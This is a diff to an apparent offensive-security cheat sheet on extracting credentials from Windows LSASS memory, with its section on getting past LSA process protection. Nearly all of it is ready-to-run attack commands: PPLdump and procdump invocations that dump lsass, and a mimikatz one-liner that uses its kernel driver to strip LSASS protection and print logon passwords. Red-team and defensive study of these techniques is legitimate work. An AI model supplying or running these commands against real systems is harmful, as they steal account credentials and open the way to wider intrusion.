@@ -2,12 +2,12 @@
 
 ## Tools: CrackMapExec/Netexec , lsassy , mimikatz , meterpreter , procdump , PPLDump , GUI
 
-#### 1) LSASS as a Protected Process
+#### 1) LSASS as a Protected Process (LSA Bypass, Mimidrv.sys)
 
     PPLdump64.exe LSASS.EXE|LSASS_PID lsass.dmp
 
-    mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe:" "!-" (With mimidriver.sys)
-
+    mimikatz "!+" "!processProtect /process:mimikatz.exe" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe:" "!-" 
+    
 #### 2) Procdump
 
     Procdump.exe -accepteula -ma lsass.exe lsass.dmp
